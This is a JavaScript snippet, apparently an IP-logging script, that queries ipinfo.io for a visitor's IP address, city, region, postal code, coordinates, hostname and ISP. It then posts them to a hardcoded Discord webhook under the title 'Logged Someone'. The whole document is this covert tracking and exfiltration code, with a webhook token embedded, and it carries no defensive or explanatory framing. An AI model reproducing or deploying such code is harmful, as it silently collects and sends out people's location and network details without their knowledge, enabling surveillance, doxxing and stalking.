$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Logged Someone",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `> ${data.ip}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1038098194560712734/YEDj48XTRsB76GbiHtlvs4a-5-tpP_1q8QB7IQCJXOgfYGit_vjMdOfUUJ-dB4LDj5ax', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
    console.log(res);
  }) 
})
